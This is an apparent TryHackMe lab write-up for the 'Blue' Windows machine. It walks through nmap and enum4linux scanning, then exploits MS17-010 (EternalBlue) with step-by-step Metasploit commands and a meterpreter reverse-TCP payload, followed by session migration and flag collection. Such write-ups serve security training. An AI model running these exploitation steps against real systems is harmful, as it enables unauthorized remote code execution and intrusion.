# TryHackMe - Blue

## Machine Information

| Field            | Details                                                                 |
| ---------------- | ----------------------------------------------------------------------- |
| Platform         | TryHackMe                                                               |
| Machine          | Blue                                                                    |
| Difficulty       | Easy                                                                    |
| Operating System | Windows                                                                 |
| Category         | Exploitation, Privilege Escalation                                      |
| Main Skills      | SMB enumeration, EternalBlue exploitation, Windows privilege escalation |

---

# Overview

Blue is a beginner-friendly Windows machine designed to demonstrate the exploitation of a well-known SMB vulnerability.

The machine focuses on identifying exposed services, discovering a vulnerable SMB version, exploiting the MS17-010 vulnerability (EternalBlue), and obtaining administrative access.

---

# Reconnaissance

The first step was performing network enumeration to identify exposed services.

## Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed several open ports, including:

```text
445/tcp  Microsoft Windows SMB
139/tcp  NetBIOS
```

The SMB service was running on the target system, which suggested further enumeration was required.

---

# SMB Enumeration

SMB information was gathered using enumeration tools.

Example:

```bash
enum4linux <TARGET_IP>
```

The enumeration revealed information about the Windows system and confirmed that SMB was accessible.

Further investigation showed that the machine was vulnerable to:

```text
MS17-010
```

also known as:

```text
EternalBlue
```

---

# Exploitation

The vulnerability affects Microsoft's SMBv1 implementation and allows remote code execution.

The exploit was performed using Metasploit.

Start Metasploit:

```bash
msfconsole
```

Search for the EternalBlue exploit:

```text
search eternalblue
```

Select the exploit:

```text
use exploit/windows/smb/ms17_010_eternalblue
```

Configure the target:

```text
set RHOSTS <TARGET_IP>
```

Configure the payload:

```text
set payload windows/x64/meterpreter/reverse_tcp
```

Run the exploit:

```text
exploit
```

A Meterpreter session was successfully obtained.

---

# Post Exploitation

After gaining access, system information was collected.

```bash
sysinfo
```

The session provided high privileges, allowing access to the Windows system.

---

# Privilege Escalation

The exploit already provided elevated privileges due to the nature of the vulnerability.

The Meterpreter session was migrated to a stable process:

```bash
ps
```

```bash
migrate <PID>
```

This ensured a more reliable session.

---

# Flag Collection

The required flags were located through enumeration of the Windows filesystem.

User information:

```text
C:\Users\
```

Administrator information:

```text
C:\Users\Administrator\
```

The flags were successfully retrieved.

---

# Tools Used

* Nmap
* Enum4linux
* Metasploit Framework
* Meterpreter

---

# Vulnerabilities Identified

## MS17-010 EternalBlue

**Type:** Remote Code Execution

**Affected Component:**

```text
Microsoft SMBv1
```

**Impact:**

An attacker can execute arbitrary code remotely and obtain unauthorized access to the system.
